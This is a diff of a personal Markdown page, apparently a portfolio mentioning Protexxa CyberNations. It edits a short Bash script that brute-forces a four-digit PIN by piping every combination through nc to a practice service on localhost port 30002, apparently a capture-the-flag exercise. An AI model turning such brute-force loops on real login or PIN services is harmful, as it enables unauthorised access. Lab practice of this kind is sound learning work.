@@ -75,14 +75,14 @@ At Protexxa CyberNations, I immersed myself in the world of cybersecurity. From 
 
 ### Scripting
 
-```/bin/bash
+```bash
 // Bash script code for pincode bruteforcing.
 #!/bin/bash
 for i in {0000..9999}
-  do echo "password $i" >> /tmp/tmp/winraw/pincode.txt
+  do echo "password $i" >> pincode.txt
 done
 
-cat pincode.txt | nc localhost 30002 >> passwordfornextlevel.txt
+cat pincode.txt | nc localhost 30002 >> password.txt
 ```
 
 #### Header 4
